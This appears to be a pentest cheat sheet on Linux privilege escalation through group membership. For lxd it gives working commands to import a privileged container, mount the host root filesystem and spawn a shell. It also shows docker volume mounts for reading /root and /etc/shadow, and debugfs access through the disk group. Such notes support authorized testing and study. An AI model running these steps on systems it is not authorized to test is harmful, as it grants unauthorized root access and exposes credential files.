* lxc/lxd
	* Build an alpine image using [lxd alpine builder](https://github.com/saghul/lxd-alpine-builder) and upload it to target.
	* Upload a container image and import it into lxc: `lxc image import <container image zip/tar file> --alias <alias>`
	* Initiate the imported image with `security.privileged` flag: `lxc init <alias> privesc -c security.privileged=true`
	* Mount `/` directory into the container filesystem: `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
	* Start container: `lxc start privesc`
	* Spawn a shell into container: `lxc exec privesc /bin/bash`
	* Access the entire file system by going to `/mnt/root` directory.

* docker
	* Can start docker containers and has the same access as root in the container.
	* List docker images: `docker image ls`
	* Can run `docker run -v /root:/mnt -it <image>` this mounts `/root` for a docker container.
	* Can access the mounter root directory in the container.
	* Can similarly mount other directories such as `/etc` as well to get shadow file.
* disk
	* Can access files in `/dev` directory such as `/dev/sda1`. 
	* Can use `debugfs` to access the entire file system with root level privileges.
* adm
	* A member of this group can mainly read logs from `/var/log` directory.
